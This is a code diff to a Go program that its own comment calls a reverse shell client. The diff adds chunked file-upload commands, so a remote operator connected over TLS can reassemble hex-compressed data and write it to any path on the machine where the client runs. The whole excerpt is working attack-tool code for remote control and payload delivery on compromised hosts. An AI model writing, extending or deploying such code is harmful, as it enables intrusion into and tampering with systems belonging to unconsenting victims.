@@ -18,11 +18,13 @@ import (
 
 // ReverseClient represents a reverse shell client
 type ReverseClient struct {
-	target      string
-	conn        *tls.Conn
-	reader      *bufio.Reader
-	writer      *bufio.Writer
-	isConnected bool
+	target            string
+	conn              *tls.Conn
+	reader            *bufio.Reader
+	writer            *bufio.Writer
+	isConnected       bool
+	currentUploadPath string
+	uploadChunks      []string
 }
 
 func compressToHex(data []byte) (string, error) {
@@ -143,6 +145,69 @@ func (rc *ReverseClient) HandleCommands() error {
 
 		if command == "exit" {
 			return nil
+		}
+
+		// handle file transfers before shell execution
+		if strings.HasPrefix(command, "START_UPLOAD ") {
+			parts := strings.SplitN(command, " ", 3)
+			if len(parts) != 3 {
+				rc.writer.WriteString("Invalid start_upload command\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.Flush()
+				continue
+			}
+			remotePath := parts[1]
+			// Store the path for chunk collection
+			rc.currentUploadPath = remotePath
+			rc.uploadChunks = []string{}
+			rc.writer.WriteString("OK\n<<<END_OF_OUTPUT>>>\n")
+			rc.writer.Flush()
+			continue
+		}
+
+		if strings.HasPrefix(command, "UPLOAD_CHUNK ") {
+			if rc.currentUploadPath == "" {
+				rc.writer.WriteString("No active upload\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.Flush()
+				continue
+			}
+			chunk := strings.TrimPrefix(command, "UPLOAD_CHUNK ")
+			rc.uploadChunks = append(rc.uploadChunks, chunk)
+			rc.writer.WriteString("OK\n<<<END_OF_OUTPUT>>>\n")
+			rc.writer.Flush()
+			continue
+		}
+
+		if strings.HasPrefix(command, "END_UPLOAD ") {
+			parts := strings.SplitN(command, " ", 2)
+			if len(parts) != 2 {
+				rc.writer.WriteString("Invalid end_upload command\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.Flush()
+				continue
+			}
+			remotePath := parts[1]
+			
+			// Reconstruct and write file
+			fullData := strings.Join(rc.uploadChunks, "")
+			data, err := decompressHex(fullData)
+			if err != nil {
+				rc.writer.WriteString(fmt.Sprintf("Decode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.Flush()
+				rc.currentUploadPath = ""
+				rc.uploadChunks = []string{}
+				continue
+			}
+			if err := os.WriteFile(remotePath, data, 0644); err != nil {
+				rc.writer.WriteString(fmt.Sprintf("Write error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.Flush()
+				rc.currentUploadPath = ""
+				rc.uploadChunks = []string{}
+				continue
+			}
+			rc.writer.WriteString(fmt.Sprintf("Uploaded %d bytes to %s\n<<<END_OF_OUTPUT>>>\n", len(data), remotePath))
+			rc.writer.Flush()
+			rc.currentUploadPath = ""
+			rc.uploadChunks = []string{}
+			continue
 		}
 
 		// handle file transfers before shell execution
